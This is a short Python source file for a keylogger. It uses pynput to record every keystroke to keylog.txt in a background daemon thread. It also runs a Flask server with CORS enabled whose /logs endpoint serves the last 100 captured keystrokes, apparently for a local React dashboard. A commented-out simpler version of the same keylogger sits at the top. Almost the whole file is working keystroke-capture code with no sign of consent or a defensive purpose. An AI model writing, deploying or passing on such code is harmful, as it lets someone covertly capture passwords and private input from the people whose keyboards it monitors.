# from pynput import keyboard

# def on_press(key):
#     with open("keylog.txt", "a") as log_file:
#         try:
#             log_file.write(f"{key.char}")
#         except AttributeError:
#             log_file.write(f" [{key}] ")

# with keyboard.Listener(on_press=on_press) as listener:
#     listener.join()

from flask import Flask, jsonify
from flask_cors import CORS
from pynput import keyboard
import threading

app = Flask(__name__)
CORS(app)  # Enable CORS for local React access

log_file = "keylog.txt"

# API route to fetch keylogs
@app.route('/logs', methods=['GET'])
def get_logs():
    try:
        with open(log_file, 'r') as f:
            lines = f.readlines()
        return jsonify(lines[-100:])  # last 100 logs
    except FileNotFoundError:
        return jsonify([])

# Keylogger thread function
def start_keylogger():
    def on_press(key):
        with open(log_file, "a") as f:
            try:
                f.write(f"{key.char}")
            except AttributeError:
                f.write(f" [{key}] ")
            f.write("\n")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Run keylogger in background
keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
keylogger_thread.start()

if __name__ == '__main__':
    app.run(debug=True)
